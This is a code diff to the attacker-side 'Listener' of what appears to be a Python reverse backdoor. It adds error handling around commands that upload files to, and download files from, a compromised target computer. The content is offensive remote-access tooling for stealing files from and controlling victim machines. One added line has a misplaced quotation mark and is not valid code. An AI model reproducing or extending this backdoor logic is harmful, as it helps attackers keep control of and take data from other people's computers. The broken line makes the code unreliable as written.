@@ -55,15 +55,21 @@ class Listener:
             #["upload", "sample.txt", "whatever file contains"]
             #this will send a list to the target computer
             #containing these elements
-            if command[0] == "upload":
-                file_content = self.read_file(command[1])
-                command.append(file_content) #need to append third list
-                #element in order to send file to remote computer;
-                #file_content is sent and then called by reverse_backdoor
-                #with command[2] item in list specifying file
-            result = self.execute_remotely(command, buffer_size)
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
+            
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content) #need to append third list
+                    #element in order to send file to remote computer;
+                    #file_content is sent and then called by reverse_backdoor
+                    #with command[2] item in list specifying file
+                result = self.execute_remotely(command, buffer_size)
+
+                if command[0] == "download" and [-] Error " not in result: #
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error during command execution."
+                
             print(result)
             
     def write_file(self, path, content):
